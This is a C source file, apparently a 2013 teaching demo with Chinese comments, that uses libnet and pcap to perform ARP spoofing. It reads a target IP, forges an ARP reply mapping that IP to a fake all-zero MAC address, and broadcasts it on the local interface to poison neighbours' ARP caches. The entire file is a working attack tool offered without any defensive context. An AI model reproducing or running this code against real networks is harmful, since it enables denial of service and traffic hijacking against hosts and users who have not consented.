/*=========================================================================
  工程名称：	libnet-arp-demo
  组成文件：	libnet-arp-demo.c
  功能描述： 	libnet实现arp欺骗
  维护记录：	
				2013-06-01 v1.0		add by sunplusedu
=========================================================================*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libnet.h>
#include <pcap.h>

#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN 4
typedef unsigned char uchar;
typedef unsigned long ulong;

int main(int argc,char **argv)
{
	libnet_t *net_t = NULL; 	//定义libnet_t指针变量
	char *dev = "eth0"; 		//定义设备名称
	char err_buf[LIBNET_ERRBUF_SIZE];
	libnet_ptag_t p_tag; 		//定义libnet_ptag_t变量
	uchar src_mac[MAC_ADDR_LEN] = {0x00,0x00,0x00,0x00,0x00,0x00};//发送者网卡地址（伪装mac）
	uchar dst_mac[MAC_ADDR_LEN] = {0xff,0xff,0xff,0xff,0xff,0xff};//接收者网卡地址
	char src_ip_str[20] = ""; //源主机IP地址（被伪装的ip）
	ulong src_ip,dst_ip = 0;
	char *net_interface = NULL;
	
	printf("please input the aim ip:\n");
	fgets(src_ip_str, sizeof(src_ip_str), stdin);
	src_ip_str[strlen(src_ip_str)-1]='\0';
	
	src_ip = libnet_name2addr4(net_t,src_ip_str,LIBNET_RESOLVE);//将字符串类型的ip转换为顺序网络字节流
   
   net_interface = pcap_lookupdev(err_buf);
	if(NULL == net_interface)
	{
		perror("pcap_lookupdev");
		exit(-1);
	}
	
	net_t  = libnet_init(LIBNET_LINK_ADV, net_interface, err_buf);//初始化发送包结构       
	if(net_t == NULL)
	{
		printf("libnet_init error\n");
		exit(-1);
	}

	p_tag = libnet_build_arp(
								ARPHRD_ETHER,//hardware type ethernet  以太网
								ETHERTYPE_IP,//protocol type   ip协议
								MAC_ADDR_LEN,//mac length  6
								IP_ADDR_LEN,//protocol length  4
								ARPOP_REPLY,//op type  2 arp应答
								(u_int8_t *)src_mac,//source mac addr这里的作用是更新目的地的arp表
								(u_int8_t *)&src_ip,//source ip addr
								(u_int8_t *)dst_mac,//dest mac addr
								(u_int8_t *)&dst_ip,//dest ip  addr
								NULL,    //payload
								0,      //payload length
								net_t,    //libnet context
								0      //0 stands to build a new one
							);
	if(-1 == p_tag)
	{
		printf("libnet_build_arp error");
		exit(-1);
	}

	//以太网头部
	p_tag = libnet_build_ethernet(//create ethernet header
									(u_int8_t *)dst_mac,//dest mac addr
									(u_int8_t *)src_mac,//source mac addr
									ETHERTYPE_ARP,//protocol type
									NULL,//payload
									0,//payload length
									net_t,//libnet context
									0//0 to build a new one
								);
	if(-1 == p_tag)
	{
		printf("libnet_build_ethernet error");
		exit(-1);
	}
	
	int res;
	res = libnet_write(net_t);   //发送
	if(-1 == res)
	{
		printf("libnet_write error!\n");
		exit(-1);
	}
	
	libnet_destroy(net_t); //释放资源 
	printf("----SUCCESS----\n");
	return 0;
}